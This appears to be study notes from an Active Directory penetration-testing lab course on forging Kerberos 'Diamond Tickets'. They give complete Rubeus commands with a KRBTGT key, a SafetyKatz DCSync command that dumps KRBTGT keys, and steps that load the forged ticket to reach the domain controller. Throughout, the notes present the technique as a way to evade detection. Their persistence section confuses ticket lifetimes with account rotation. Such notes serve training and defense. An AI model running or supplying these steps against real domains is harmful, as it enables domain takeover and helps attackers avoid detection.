# Diamond Ticket Attack

**Date:** 03 August 2026


---

## What is a Diamond Ticket?

A forged TGT created by **decrypting a valid TGT, modifying it, and re-encrypting it** using KRBTGT AES keys.

**Key Difference from Golden Ticket:**
- **Golden Ticket:** Forge TGT from scratch (no valid basis)
- **Diamond Ticket:** Modify existing valid TGT (looks legitimate)

---

## Why Diamond Tickets Are More OPSEC-Safe

✅ **Valid ticket times** — TGT issued by DC, just modified  
✅ **Legitimate structure** — matches real TGT format  
✅ **Corresponding AS-REQ** — valid AS request for the TGT exists  
✅ **Golden Ticket gap** — Golden has no AS-REQ for TGS/ST requests  
✅ **Detection evasion** — behavioral analysis harder  

---

## Prerequisites

- **KRBTGT AES keys** (RC4 or AES256)
- **Valid TGT** (obtained from legitimate authentication or TGT delegation)
- **User credentials** or `/tgtdeleg` option
- **Target user RID** (e.g., 500 for Administrator)
- **Groups to add** (e.g., 512 for Domain Admins)

---

## Diamond Ticket Creation: Method 1 (With Credentials)

```powershell
Rubeus.exe diamond
  /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848
  /user:studentx 
  /password:StudentxPassword 
  /enctype:aes 
  /ticketuser:administrator
  /domain:dollarcorp.moneycorp.local 
  /dc:dcorp-dc.dollarcorp.moneycorp.local
  /ticketuserid:500 
  /groups:512 
  /createnetonly:C:\Windows\System32\cmd.exe 
  /show
  /ptt
```

**Parameters:**
- `/krbkey` — KRBTGT AES256 key
- `/user` — Current user (credentials provided below)
- `/password` — Current user's password
- `/enctype:aes` — Encryption type (AES256)
- `/ticketuser` — User to impersonate (Administrator)
- `/domain` — Domain FQDN
- `/dc` — Domain controller name
- `/ticketuserid` — RID of target user (500 = Administrator)
- `/groups` — Group RIDs (512 = Domain Admins)
- `/createnetonly` — Create new logon session in cmd.exe
- `/show` — Display ticket details
- `/ptt` — Pass-the-ticket (load into memory)

---

## Diamond Ticket Creation: Method 2 (With TGT Delegation)

```powershell
Rubeus.exe diamond
  /krbkey:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 
  /tgtdeleg
  /enctype:aes 
  /ticketuser:administrator 
  /domain:dollarcorp.moneycorp.local 
  /dc:dcorp-dc.dollarcorp.moneycorp.local 
  /ticketuserid:500 
  /groups:512
  /createnetonly:C:\Windows\System32\cmd.exe 
  /show 
  /ptt
```

**Parameters (differences from Method 1):**
- `/tgtdeleg` — Use TGT delegation instead of credentials
- No `/user` or `/password` needed
- Requires existing valid TGT in memory
- Better OPSEC (no plaintext password)

---

## How Diamond Ticket Works

```
1. Get valid TGT
   ↓
2. Decrypt TGT using KRBTGT AES key
   ↓
3. Modify contents:
   - Change user to Administrator
   - Add Domain Admins group (512)
   - Adjust timestamps
   ↓
4. Re-encrypt using KRBTGT AES key
   ↓
5. Load into memory (/ptt)
   ↓
6. Use as legitimate TGT
```

---

## Diamond vs Golden vs Silver

| Aspect | Diamond | Golden | Silver |
|---|---|---|---|
| What's modified | Existing TGT | Forge TGT | Forge ST |
| Starting point | Valid TGT | Scratch | Scratch |
| Valid times | Yes | Can be faked | Yes |
| KRBTGT needed | Yes | Yes | No |
| Service account hash needed | No | No | Yes |
| Looks legitimate | Yes (best) | No | N/A |
| Detection risk | Low | High | Low |
| Requires credential | Yes (method 1) | No | No |
| TGT delegation | Yes (method 2) | No | No |

---

## When to Use Diamond Tickets

✅ **Highest OPSEC** — modify vs forge  
✅ **Legitimate appearance** — matches real TGT  
✅ **No password needed** — use /tgtdeleg  
✅ **Domain admin access** — like Golden Ticket  
✅ **Hard to detect** — behavioral analysis difficult  

---

## Practical Workflow

**Step 1: Get KRBTGT keys**
```powershell
Loader.exe -Path SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```

**Step 2: Create Diamond Ticket (via TGT delegation)**
```powershell
Rubeus.exe diamond
  /krbkey:<krbtgt_aes256>
  /tgtdeleg
  /enctype:aes 
  /ticketuser:administrator
  /domain:dollarcorp.moneycorp.local 
  /dc:dcorp-dc.dollarcorp.moneycorp.local
  /ticketuserid:500 
  /groups:512
  /createnetonly:C:\Windows\System32\cmd.exe 
  /ptt
```

**Step 3: Access Domain Resources**
```powershell
# Verify admin access
winrs -r:dcorp-dc cmd
set
```

---

## Comparison: Valid Times Issue

**Golden Ticket Problem:**
```
TGT forged without AS-REQ
Creates ST without corresponding TGS-REQ
Looks suspicious to logging systems
```

**Diamond Ticket Solution:**
```
Decrypts valid TGT (AS-REQ exists)
Modifies existing ticket
Maintains legitimate timestamp structure
Behavioral analysis harder
```

---

## Detection Evasion

**Why Diamond Tickets Evade Detection:**

1. **Valid AS-REQ** — legitimate TGT request in logs
2. **Correct timestamps** — issued by real KDC
3. **Matching structure** — indistinguishable from real TGT
4. **No TGS gap** — corresponding TGS requests exist
5. **Behavioral match** — behaves like normal user

---

## Encryption Types

- `/enctype:aes` — AES256 (recommended)
- `/enctype:rc4` — RC4/NTLM (legacy, weaker)
- Use AES if KRBTGT has both keys

---

## Group IDs Reference

| Group | ID |
|---|---|
| Domain Users | 513 |
| Domain Admins | 512 |
| Schema Admins | 518 |
| Enterprise Admins | 519 |
| Local Admins | 544 |

---

## Persistence

Diamond Tickets use **KRBTGT TGT lifetime** (10+ hours default):
- Same as Golden Tickets
- Longer than Silver Tickets (30 days for account rotation)
- Credentials persist in memory for duration

---

## References

- [Rubeus - Diamond Ticket](https://github.com/GhostPack/Rubeus)
- [Kerberos TGT Modification](https://posts.specterops.io/kerberos-attack-vectors-ff1a90899106)

---

*Next: Learning Objective 9 — Cross-Forest Attacks & Persistence*
